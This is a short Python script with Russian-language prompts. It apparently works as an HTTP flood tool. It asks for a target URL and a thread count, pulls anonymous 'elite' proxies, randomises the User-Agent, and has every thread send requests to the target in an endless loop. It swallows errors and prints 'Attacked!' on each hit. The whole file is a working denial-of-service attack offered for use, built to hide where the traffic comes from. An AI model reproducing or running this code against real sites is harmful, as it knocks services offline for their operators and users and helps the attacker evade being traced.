from urllib.request import urlopen, Request
from threading import Thread
from random import choice

from proxyscan import ProxyScanIO
from fake_useragent import UserAgent

url, thr = '', 0

print('Автор: dimnissv')
while url == '' or thr == 0:
    url = input('На какой URL ломиться?: ')
    thr = int(input('Сколько использовать потоков?: '))
if 'http://' in url:
    protocol = 'http'
elif 'https://' in url:
    protocol = 'https'
else:
    url = f'http://{url}'
    protocol = 'http'

ps = ProxyScanIO()
ua = UserAgent()
head = {'User-Agent': ua.random}
proxies = ps.get_Proxies(type=protocol, level='elite')


def gotosite():
    while 1:
        proxy_host = choice(proxies)
        print(proxy_host)
        try:
            req = Request(url, headers=head)
            req.set_proxy(proxy_host, protocol)
            resp = urlopen(req, timeout=3.5)
            print(str(resp.getcode()) + 'Отакован!')
        except:
            pass


for _ in range(thr):
    t = Thread(target=gotosite)
    t.start()
